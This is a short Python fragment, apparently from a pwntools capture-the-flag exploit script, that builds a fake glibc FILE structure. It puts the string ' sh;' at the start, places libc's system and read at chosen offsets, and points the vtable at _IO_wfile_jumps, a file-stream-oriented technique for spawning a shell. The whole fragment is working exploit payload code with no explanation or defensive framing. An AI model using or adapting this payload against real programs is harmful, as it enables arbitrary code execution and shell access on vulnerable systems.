pay = flat({
    0x00: '  sh;',
    0x18: libc.sym['system'],
    0x20: fake_IO_addr,  # 0x20 > 0x18 <=> fp->_wide_data->_IO_write_ptr> fp->_wide_data->_IO_write_base
    0x68: 0,  # rdi  #read fd
    0x70: fake_IO_addr,  # rsi  #read buf
    0x88: fake_IO_addr + 0x8,  # rdx  #read size
    0xa0: fake_IO_addr,
    0xa8: libc.sym['read'],  # RCE2 ogg
    0xd8: libc.sym['_IO_wfile_jumps'] + 0x30 - 0x20,
    0xe0: fake_IO_addr,
}, filler=b'\x00')